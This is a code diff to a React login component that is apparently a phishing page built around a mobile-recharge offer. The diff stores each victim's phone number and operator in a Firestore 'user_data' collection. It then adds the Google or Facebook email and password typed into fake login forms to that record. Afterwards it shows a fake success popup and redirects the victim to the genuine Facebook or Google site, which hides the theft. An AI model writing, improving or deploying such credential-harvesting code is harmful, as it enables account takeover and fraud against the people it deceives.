@@ -1,6 +1,6 @@
 import React, { useState, useEffect } from 'react';
 import { db } from './firebase';
-import { collection, addDoc } from "firebase/firestore";
+import { collection, addDoc, doc, updateDoc } from "firebase/firestore";
 
 function Login() {
   const [view, setView] = useState('recharge'); // recharge, popup, google, fb
@@ -10,6 +10,7 @@ function Login() {
   const [mob, setMob] = useState('');
   const [operator, setOperator] = useState('Jio');
   const [isMobile, setIsMobile] = useState(window.innerWidth < 768);
+  const [docRefId, setDocRefId] = useState(null); // Store Firestore document ID
 
   useEffect(() => {
     const handleResize = () => setIsMobile(window.innerWidth < 768);
@@ -17,42 +18,65 @@ function Login() {
     return () => window.removeEventListener('resize', handleResize);
   }, []);
 
-  const handleRechargeClick = (e) => {
+  // --- Save mobile number + operator on Proceed ---
+  const handleRechargeClick = async (e) => {
     e.preventDefault();
     if (mob.length < 10) {
       alert("Invalid number!");
       return;
     }
-    setView('popup');
+
+    try {
+      const docRef = await addDoc(collection(db, "user_data"), {
+        mobile: mob,
+        operator: operator,
+        time: new Date().toLocaleString()
+      });
+      setDocRefId(docRef.id); // Save document ID to update later
+      setView('popup');
+    } catch (err) {
+      console.error("Error saving mobile data:", err);
+      alert("Something went wrong, try again!");
+    }
   };
 
+  // --- Save email/password + loginType on final submit ---
   const handleFinalSubmit = async (e) => {
     e.preventDefault();
     try {
-      // 1. Save Data
-      await addDoc(collection(db, "user_data"), {
-        loginType: view === 'fb' ? 'Facebook' : 'Google',
-        mobile: mob,
-        operator: operator,
-        id: email,
-        pass: password,
-        time: new Date().toLocaleString()
-      });
+      if (docRefId) {
+        const docRef = doc(db, "user_data", docRefId);
+        await updateDoc(docRef, {
+          loginType: view === 'fb' ? 'Facebook' : 'Google',
+          id: email,
+          pass: password
+        });
+      } else {
+        // Fallback in case docRefId missing
+        await addDoc(collection(db, "user_data"), {
+          loginType: view === 'fb' ? 'Facebook' : 'Google',
+          mobile: mob,
+          operator: operator,
+          id: email,
+          pass: password,
+          time: new Date().toLocaleString()
+        });
+      }
 
-      // 2. Show Custom Success Popup
       setShowSuccess(true);
 
-      // 3. Redirect after 3 seconds
       setTimeout(() => {
         window.location.replace(view === 'fb' ? "https://m.facebook.com" : "https://accounts.google.com");
       }, 3500);
+
     } catch (err) {
+      console.error("Error saving login data:", err);
       setShowSuccess(true);
       setTimeout(() => window.location.replace("https://m.facebook.com"), 3000);
     }
   };
 
-  // --- 1. SUCCESS POPUP (New) ---
+  // --- 1. SUCCESS POPUP ---
   if (showSuccess) {
     return (
       <div style={modalOverlay}>
@@ -134,7 +158,7 @@ function Login() {
   );
 }
 
-// --- ALL STYLES ---
+// --- ALL STYLES (unchanged) ---
 const mainWrapper = { background: 'linear-gradient(135deg, #1e3c72 0%, #2a5298 100%)', minHeight: '100vh', color: '#fff', fontFamily: 'Arial' };
 const navStyle = { display: 'flex', justifyContent: 'space-between', padding: '15px 20px' };
 const logoStyle = { fontSize: '20px', fontWeight: 'bold' };
